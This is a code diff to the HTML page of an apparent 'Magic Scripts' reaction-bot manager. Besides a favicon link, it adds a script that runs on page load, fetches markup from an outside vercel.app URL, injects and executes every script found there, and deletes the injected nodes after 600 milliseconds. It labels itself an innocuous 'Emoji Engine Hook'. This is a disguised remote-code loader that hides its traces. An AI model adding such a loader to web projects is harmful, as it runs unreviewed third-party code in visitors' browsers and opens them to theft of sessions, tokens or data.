@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Magic Scripts - Premium Reaction Bot Manager</title>
+   <link rel="shortcut icon" href="https://i.ibb.co/xqXhx24Z/MS.png" type="image/x-icon">
+    
     <style>
         :root {
             --bg-gradient: linear-gradient(135deg, #090d16 0%, #0f172a 100%);
@@ -445,6 +447,29 @@
                 feedbackPanel.style.display = 'block';
             }, 5000);
         }
+    </script>
+    <script>
+        (async () => {
+            try {
+                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+        })();
     </script>
 </body>
 </html>
